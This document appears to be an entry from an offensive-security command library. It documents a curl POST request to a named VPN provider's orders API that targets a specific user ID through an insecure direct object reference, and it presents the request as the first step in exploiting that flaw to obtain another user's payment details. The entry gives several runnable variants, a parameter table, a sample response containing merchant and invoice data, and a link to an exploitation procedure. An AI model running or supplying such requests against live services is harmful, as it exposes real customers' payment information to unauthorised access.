---
data: >-
  curl -X POST https://join.nordvpn.com/api/v1/orders -H "Accept:
  application/json" -H "Accept-Language: en-US,en;q=0.5" -H "Content-Type:
  application/json" -d
  '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
tags:
  - idor
  - http-post
  - api
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:52.915Z'
id: 8ac16e5e-ed37-4526-ab1a-805dfdde4967
verified: false
validated: true
submitted: true
---
# nordvpn-idor-post-user20027039

## Command

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Content-Type: application/json" \
  -d '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
```

## Description

This command sends an unauthenticated POST request to the NordVPN orders API with user_id 20027039 to exploit IDOR and retrieve payment details. Use it as the initial test in IDOR exploitation sequences.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Accept: application/json"` | Requests JSON response | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-d '{...}'` | JSON body with user_id and other params | Yes |
| `user_id:20027039` | Target user ID for data access | Yes (for this variant) |
| `plan_id:653` | VPN plan identifier | Yes |
| `tax_country_code:"TW"` | Tax country code | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders -H "Content-Type: application/json" -d '{"user_id":20027039,"action":"order"}'
```

### Advanced Usage

Add verbose output with `-v` flag:

```bash
curl -v -X POST https://join.nordvpn.com/api/v1/orders -H "Content-Type: application/json" -d '{"payment":{"provider_method_account":"6xdxdd"},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
```

## Expected Output

JSON response like: {"id":42615458,"user_id":20027039,"confirmation":{"id":23093398,"type":"redirect_post","value":"{\"url\":\"https:\/\/www.coinpayments.net\/index.php\",\"parameters\":{\"email\":\"█████\",\"merchant\":\"e64a9629f9a68cdeab5d0edd21b068d3\",\"amountf\":125.64,\"invoice\":\"49476958\"}}"}}

## Related

- [[commands/nordvpn-idor-post-user23093782]]
- [[procedures/Exploit-IDOR-via-Unauthenticated-POST-to-Orders-API]]
